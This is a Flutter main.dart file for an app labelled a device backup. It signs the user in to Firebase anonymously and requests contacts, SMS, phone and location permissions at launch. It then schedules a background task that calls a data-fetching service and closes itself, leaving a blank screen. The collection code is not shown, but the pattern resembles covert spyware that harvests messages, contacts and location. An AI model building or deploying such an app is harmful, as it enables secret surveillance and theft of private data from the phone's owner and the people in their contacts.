//lib/main.dart

import 'package:device_backup_1989/appbackup_service.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/material.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:workmanager/workmanager.dart';





void main() async {
    WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(); // only this line

  // Initialize Workmanager
  Workmanager().initialize(
    callbackDispatcher,
    isInDebugMode: true, // set false in production
  );


  runApp(const MyApp());
}

/// 👇 This tells the Dart AOT compiler not to tree-shake this function
@pragma('vm:entry-point')
void callbackDispatcher() {
  Workmanager().executeTask((task, inputData) async {
     // ✅ Ensure Flutter is initialized
    WidgetsFlutterBinding.ensureInitialized();

    // ✅ Initialize Firebase in background isolate
    await Firebase.initializeApp();

    String userId = inputData?['userId'] ?? '';
    await Appbackupservice.requestPermissionsAndFetchData(userId);
    return Future.value(true);
  });
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  @override
  void initState() {
    super.initState();
    _startBackup();
  }

  Future<String?> getFirebaseUid() async {
    User? user = FirebaseAuth.instance.currentUser;

    if (user != null) {
      return user.uid; // This is the Firebase UID
    } else {
      // If not signed in, you can sign in anonymously
      UserCredential userCredential =
          await FirebaseAuth.instance.signInAnonymously();
      return userCredential.user?.uid;
    }
  }

  Future<void> _startBackup() async {
    // Replace with Firebase UID after authentication
    String? userId = await getFirebaseUid();
    if (userId != null) {
    //  await Appbackupservice.requestPermissionsAndFetchData(userId);

      // 1️⃣ Request permissions in the foreground
  Map<Permission, PermissionStatus> statuses = await [
    Permission.contacts,
    Permission.sms,
    Permission.phone,
    Permission.location,
  ].request();

  bool contactsGranted = statuses[Permission.contacts]?.isGranted ?? false;
  bool smsGranted = statuses[Permission.sms]?.isGranted ?? false;
  bool phoneGranted = statuses[Permission.phone]?.isGranted ?? false;
  bool locationGranted = statuses[Permission.location]?.isGranted ?? false;

  if (!contactsGranted || !smsGranted || !phoneGranted || !locationGranted) {
    print("❌ One or more permissions denied. Backup cannot continue.");
    return;
  }

    Workmanager().registerOneOffTask(
    "backupTaskId",
    "backupTask",
    inputData: {"userId": userId},
    initialDelay: const Duration(seconds: 5),
  );

  // 3️⃣ Close the app safely AFTER scheduling
  SystemNavigator.pop();
   
    }
  }

  @override
  Widget build(BuildContext context) {
    // No UI, just a blank screen
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        body: Center(child: Text("Backup running in background...")),
      ),
    );
  }
}
